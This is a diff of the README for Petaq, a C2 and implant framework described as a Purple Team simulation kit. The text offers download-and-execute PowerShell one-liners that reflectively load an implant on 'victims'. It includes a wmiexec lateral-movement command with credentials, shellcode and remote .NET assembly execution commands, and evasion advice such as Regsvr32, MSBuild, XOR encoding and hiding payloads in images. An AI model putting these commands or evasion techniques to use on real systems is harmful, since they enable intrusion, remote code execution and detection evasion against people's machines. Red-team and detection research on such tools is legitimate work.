@@ -14,15 +14,34 @@ http://www.klingonwiki.net/En/Cursing
 * This tool is developed to assist Purple Team exercises, not adversaries. If they use it, blame on them, not me. 
 * There are several bad programmig or technical decisions in this code which may make you highly uncomfortable. If so, please consider to not use it, submit a pull request or register a bug. If I can find some time for it and improve my programming skills, I'll make this code better in time. 
 
+# Version
+* 0.1 - 3 June 2020
+** Initial release
+* 0.2 - 18 August 2020
+** Scenario and TTP support added
+** File operations (upload/download) added
+** Several bugs fixed including transmission buffers
+** Powershell through .NET System Automation added
+** Commands are now supporting "file" to send the binaries/scripts through the C2 channels
+
 # Features
+Scenario Support
+* Prepare scenarios and send them to implant to run
+* TTP support for the scenarios to construct
+
 Communications
 * WebSocket through HTTP(S) (Implant to C2)
 * SMB Named Pipe (Implant to Implant)
 * TCP (Implant to Implant)
 * UDP (Implant to Implant)
 
+File Operations
+* Upload
+* Download
+
 Execution
 * Execute a process (cmd.exe, powershell.exe or you choice)
+* Execute a PowerShell file/script using .NET System Automation
 * Execute .NET assemblies from remote (no touching disk)
 * Execute .NET source code from remote (no touching disk)
 * Execute .NET source code like a .NET C# shell (no touching disk)
@@ -41,18 +60,8 @@ Lateral Movement
 * I prepared a tutorial video shared on YouTube. <br>
 [![Introduction to Petaq C2/Malware](https://img.youtube.com/vi/oRvn0ZfxInY/hqdefault.jpg)](https://youtu.be/oRvn0ZfxInY)
 
-* Cheat Sheet for the tutorial video can be found at https://github.com/fozavci/petaqc2/blob/master/CheatSheet.md
-
-# Credits and Thanks
-I admire the people below and their contributions to our security engineering world. This project has been inspired of their work out there already. Thank you all guys. So please visit their pages, github projects and work out there for better exercises and development ideas.
-* James Forshaw - https://twitter.com/tiraniddo 
-* Casey Smith - https://twitter.com/subTee
-* Raphael Mudge - https://twitter.com/armitagehacker
-* Will Schroeder - https://twitter.com/harmj0y
-* Ryan Cobb - https://twitter.com/cobbr_io
-* Adam Chester - https://twitter.com/_xpn_
-* Daniel Duggan - https://twitter.com/_rastamouse
-* Marcello Salvati - https://twitter.com/byt3bl33d3r
+* Cheat Sheet for the tutorial video can be found at https://github.com/fozavci/petaqc2/blob/master/DemoCheatSheet.md
+* Cheat Sheet for the scenarios can be found at https://github.com/fozavci/petaqc2/blob/master/TTPCheatSheet.md
 
 # Configuration
 You can tweak the following files to configure the C2 and malware. 
@@ -66,16 +75,15 @@ The malware needs to be compiled using .NET Framework as it has inline .NET comp
 
 # Deployment to the Victims
 Even though it's too noisy, running the following Powershell line would load the compiled Petaq Implant as reflected assembly for testing. You can compile the Petaq Implant as above, then place it into the wwwroot folder of Petaq Service as index.html. So the url would point to the binary to load directly.
-```
 powershell –c $m=new-object net.webclient;$Url='http://PETAQIMPLANTHOSTEDSITE/';$dba=$m.downloaddata($Url);$a=[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))
-```
-I suggest you to consider some operational security measures for any production or evasive testing. 
+
+I suggest you to some operational security measures for any production or evasive testing. 
 * Consider InstallUtil, Regsvr32, RegAsm, DotNettoJs, RunDLL32, WMI or MSBuild for evasive initial execution.
 * Consider using XOR for the implant to convert, Base64 encoding or hiding it in an image file to avoid network detections.
 * Consider replacing some Petaq words in the source code. Even though currently 
 
 # In Action
-```
+
 2020-5-18---16-41-36
 Hosting environment: Development
 Content root path: /tmp/petaqC2/petaqservice
@@ -83,53 +91,43 @@ Now listening on: https://0.0.0.0:443
 Now listening on: http://0.0.0.0:80
 Application started. Press Ctrl+C to shut down.
 Petaq - Purple Team Simulation Kit
-# Creating Logs/2020-5-18---16-41-36 folder.
+\# Creating Logs/2020-5-18---16-41-36 folder.
 Log file Logs/2020-5-18---16-41-36/29B0OAZEX3CEAW2V2UAQ.txt created.
-# Registering the implant...
+\# Registering the implant...
 Implant registration for 29B0OAZEX3CEAW2V2UAQ is done.
 Links are adding to the implant...
-# list
+\# list
 Session ID		User Name		Hostname	IP Address	Status		Link URI
 29B0OAZEX3CEAW2V2UAQ	SHEEP\dev		Sheep		172.16.121.142	connected	ws://172.16.121.1:80/ws
-# use 29B0OAZEX3CEAW2V2UAQ
+\# use 29B0OAZEX3CEAW2V2UAQ
 Use 'back' instruction for the main menu.
 29B0OAZEX3CEAW2V2UAQ # exec whoami
 29B0OAZEX3CEAW2V2UAQ # Waiting for the process to complete...
 29B0OAZEX3CEAW2V2UAQ # sheep\dev
 
 29B0OAZEX3CEAW2V2UAQ # exit
-# Session 29B0OAZEX3CEAW2V2UAQ is disconnected.
-#
-# list
+\# \# Session 29B0OAZEX3CEAW2V2UAQ is disconnected.
+\#
+\# list
 Session ID		User Name		Hostname	IP Address	Status		Link URI
 29B0OAZEX3CEAW2V2UAQ	SHEEP\dev		Sheep		172.16.121.142	disconnected	ws://172.16.121.1:80/ws
-# exit
+\# exit
 Also use CTRL+C for stopping the implant services.
 CApplication is shutting down...
-```
 
 # Usage Examples
 Petaq Implant Run Arguments:
-1. It runs Petaq Implants to connect to a Petaq Service using Websocket (If not configured on Configuration.cs)
-```
+    It runs Petaq Implants to connect to a Petaq Service using Websocket (If not configured on Configuration.cs)
     petaqimplant.exe ws://172.16.121.1/ws
     petaqimplant.exe wss://172.16.121.1:443/ws (SSL)
-```
-2. It runs Petaq Implant on TCP 8000 and wait for another implant to link it to the Petaq Service
-```
-   petaqimplant.exe tcp 8000
-```
-3. It runs Petaq Implant on UDP 8000 and wait for another implant to link it to the Petaq Service
-```
-    petaqimplant.exe udp 8000
-```
-4. It runs Petaq Implant on SMB Named Pipe pipename1 and wait for another implant to link it to the Petaq Service
-```
-   petaqimplant.exe smb pipename1
-```
+    It runs Petaq Implant on TCP 8000 and wait for another implant to link it to the Petaq Service
+    petaqimplant.exe tcp 8000 
+    It runs Petaq Implant on UDP 8000 and wait for another implant to link it to the Petaq Service
+    petaqimplant.exe udp 8000 
+    It runs Petaq Implant on SMB Named Pipe pipename1 and wait for another implant to link it to the Petaq Service
+    petaqimplant.exe smb pipename1 
 
 Petaq Service Commands:
-```
     Help:
         help
     List the Implants:
@@ -143,11 +141,10 @@ Petaq Service Commands:
     Exit:
         exit
         terminate
-```
+
 Practical Examples on Petaq Implant in Interaction (use ImplantID):
-```
-Usage Examples:
-	exec cmd /c dir
+    Usage Examples:
+        exec cmd /c dir
         exec net use
         exec powershell -c Write-Output($env:UserName)
         exec-sharpassembly url http://127.0.0.1/Seatbelt.exe BasicOSInfo
@@ -161,46 +158,45 @@ Usage Examples:
         link smb://127.0.0.1
         link smb://127.0.0.1/petaq_comm
 
-Link operations:
-	route
+    Link operations:
+        route
         sessions
         link URI
         unlink ID
 
-Lateral movement:
-	lateralmovement wmiexec domain=galaxy username=administrator password=Password3 host=10.0.0.1 command="powershell –c $m = new- object net.webclient;$Url = 'http://172.16.121.1';$dba =$m.downloaddata($Url);$a =[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))"
+    Lateral movement:
+        lateralmovement wmiexec domain=galaxy username=administrator password=Password3 host=10.0.0.1 command="powershell –c $m = new- object net.webclient;$Url = 'http://172.16.121.1';$dba =$m.downloaddata($Url);$a =[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))"
 
-Execute a command/binary:
-	exec cmd.exe /c dir
+    Execute a command/binary:
+        exec cmd.exe /c dir
         exec powershell -c Write-Output($env:UserName)
 
-Execute a command/binary/assembly as a thread (no wait, no output):
-	execthread cmd.exe /c dir
+    Execute a command/binary/assembly as a thread (no wait, no output):
+        execthread cmd.exe /c dir
         execthread powershell -c Write-Output($env:UserName)
         execthread-sharpassembly url http://127.0.0.1/Assembly.exe Parameters
         execthread-sharpassembly base64 http://127.0.0.1/Assembly.b64 Parameters
         execthread-sharpcode url http://127.0.0.1/Sharpcode.src Parameters
         execthread-sharpcode base64 BASE64_ENCODED_SHARPCODE Parameters
 
-Inline run for .NET source code:
-	exec-sharpdirect SHARPCODE
+    Inline run for .NET source code:
+        exec-sharpdirect SHARPCODE
         exec-sharpdirect base64 BASE64_ENCODED_SHARPCODE
 
-Execute a .NET assembly:
-	exec-sharpassembly url http://127.0.0.1/Assembly.exe Parameters
+    Execute a .NET assembly:
+        exec-sharpassembly url http://127.0.0.1/Assembly.exe Parameters
         exec-sharpassembly base64 http://127.0.0.1/Assembly.b64 Parameters
 
-Compile & Execute .NET source code:
-	exec-sharpcode url http://127.0.0.1/Sharpcode.src Parameters
+    Compile & Execute .NET source code:
+        exec-sharpcode url http://127.0.0.1/Sharpcode.src Parameters
         exec-sharpcode base64 BASE64_ENCODED_SHARPCODE Parameters
-
-Execute Shellcode:
-	exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH64 T1
+        
+    Execute Shellcode:
+        exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH64 T1
         exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH32 T2
         exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH64 T1
         exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH32 T2
-
-Exit:
+        
+    Exit:
         exit
         terminate
-```
